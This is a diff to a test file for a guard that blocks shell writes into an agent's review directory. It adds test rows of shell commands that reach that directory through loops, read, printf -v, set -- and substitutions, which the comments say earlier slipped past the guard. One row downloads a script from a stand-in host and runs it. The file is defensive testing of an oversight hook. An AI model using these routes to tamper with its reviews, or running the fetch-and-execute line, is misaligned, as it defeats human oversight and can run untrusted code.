@@ -3,7 +3,7 @@
 
 The cases and the runner live in `test-block_review_file_edit.py` beside this file, so the two halves are judged by one set of rules; this file runs the shell cases through dispatch.py in both directions, then plants the guard's DEFECT and requires the run to fail.
 
-The cases below are this guard's own, added to the shared shell cases: the operand arms read the words as bash expands them (#f6334e52), the glob pre-filter reads only a glob that can spell the review directory as one (#a1852a9e), a redirect target and an in-place option are read as bash expands them (#4deea064), and a copied script carries its source (#3ff3bb16). Each MUTANT plants the defect one of them fixed and must turn at least one row, so neither fix is pinned by a harness that cannot see it.
+The cases below are this guard's own, added to the shared shell cases: the operand arms read the words as bash expands them (#f6334e52), the glob pre-filter reads only a glob that can spell the review directory as one (#a1852a9e), a redirect target and an in-place option are read as bash expands them (#4deea064), a copied script carries its source (#3ff3bb16), and a word the walk cannot expand is read by where its value comes from (#b53f586d). Each MUTANT plants the defect one of them fixed and must turn at least one row, so neither fix is pinned by a harness that cannot see it.
 
     test-block_review_file_shell_write.py
 """
@@ -121,6 +121,59 @@ OWN_CASES = [
         "D=agent/reviews/x; read D <<< plain; echo hi > $D/y.md",
         False,
     ),
+    # #b53f586d: a word the walk cannot expand is read by where its value comes from. Each refusal was allowed (rc 0) at 6238f04a6 while bash 5.3 writes the review file; the controls were allowed there too and stay allowed.
+    (
+        "a for loop walks the review directory",
+        "for D in agent/reviews/x; do echo hi > $D/y.md; done",
+        True,
+    ),
+    (
+        "tee through a loop over the review directory",
+        "for D in agent/reviews/x; do tee $D/y.md; done",
+        True,
+    ),
+    (
+        "a loop word that globs the directory",
+        "for D in agent/revi*s/x; do echo hi > $D/y.md; done",
+        True,
+    ),
+    (
+        "a trimmed loop value",
+        "for f in agent/reviews/x/a.md; do cp /tmp/a ${f%.md}.txt; done",
+        True,
+    ),
+    ("read takes the review directory", "read D <<< agent/reviews/x; echo hi > $D/y.md", True),
+    (
+        "printf -v assigns the review directory",
+        "printf -v D %s agent/reviews/x; echo hi > $D/y.md",
+        True,
+    ),
+    ("set -- assigns the review directory", "set -- agent/reviews/x; echo hi > $1/y.md", True),
+    ("a substitution names the review directory", 'echo hi > "$(echo agent/reviews/x)/y.md"', True),
+    ("a default assigns the review directory", "echo hi > ${D:=agent/reviews/x}/y.md", True),
+    ("an unknown segment under cd agent", "cd agent && echo hi > $X/y.md", True),
+    ("an unknown segment after agent/", "echo hi > agent/$X", True),
+    ("a for loop elsewhere", "for D in plain; do echo hi > $D/y.md; done", False),
+    ("an unknown target outside agent", "echo hi > $D/y.md", False),
+    ("two unknown segments", 'cat agent/reviews/x/a.md > "$OUT/$NAME"', False),
+    (
+        "a mktemp target on a line reading a review",
+        "T=$(mktemp); cat agent/reviews/x/a.md > $T",
+        False,
+    ),
+    (
+        "a trimmed loop value lands elsewhere",
+        "for f in agent/reviews/x/a.md; do cp /tmp/a /tmp/${f##*/}; done",
+        False,
+    ),
+    ("a loop that reads review files", 'for f in agent/reviews/x/*.md; do cat "$f"; done', False),
+    ("set -- elsewhere", "set -- plain; cat agent/reviews/x/a.md > $1/y.md", False),
+    # #b53f586d: a downloaded script names no review word and has no source on disk; it was allowed (rc 0) at 6238f04a6.
+    (
+        "a downloaded script run in the same command",
+        "curl -s https://example.invalid/x > /tmp/r97u.py && python3 /tmp/r97u.py",
+        True,
+    ),
 ]
 
 MUTANTS = [
@@ -154,6 +207,34 @@ MUTANTS = [
                 "for w in joined[:1] for form in [*_review_forms(w), *("
                 "str(cwd).rstrip('/') + '/' + f for f in _review_forms(w) if cwd)]"
             ),
+        ),
+    ),
+    (
+        "an unexpandable redirect read as typed only (#b53f586d)",
+        (
+            "for form, definite in _readings(target, run, cmd):",
+            "for form, definite in []:",
+        ),
+    ),
+    (
+        "loop values not read (#b53f586d)",
+        (
+            '    if kind == "var" and name in loop:\n        return list(loop[name]), True\n',
+            "",
+        ),
+    ),
+    (
+        "a variable's spelled source not read (#b53f586d)",
+        (
+            "source = _value_source(name, cmd, shellscan._CLOBBERED in str(value))",
+            "source = None",
+        ),
+    ),
+    (
+        "unjudgeable programs judged by the review word alone (#b53f586d)",
+        (
+            "and not _programs_name_reviews(cmd, cwd)",
+            'and not any("reviews" in t for t in shellscan.interpreter_scripts(cmd, cwd))',
         ),
     ),
 ]
